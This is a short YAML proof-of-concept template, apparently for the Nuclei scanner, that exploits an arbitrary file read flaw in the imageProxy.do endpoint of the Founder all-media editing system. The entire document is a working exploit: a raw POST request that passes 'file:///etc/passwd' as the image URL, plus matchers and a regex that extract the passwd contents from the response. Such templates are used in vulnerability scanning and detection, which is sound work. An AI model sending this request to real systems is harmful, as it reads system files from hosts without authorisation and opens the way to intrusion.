id: poc-yaml-founder-imageproxy-do-anyfile-read
info:
  name: 方正全媒体采编系统 imageProxy.do 任意文件读取漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: file-read
http:
  - raw:
      - |
        POST /newsedit/outerfotobase/imageProxy.do HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8

        oriImgUrl=file:///etc/passwd
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "root:"
          - "/bin"
      - type: word
        part: content-type
        words:
          - "image/jpeg"
      - type: word
        part: body
        words:
          - "<"
        negative: true
    extractors:
      - type: regex
        part: body
        regex:
          - "root:.*:/bin.*"
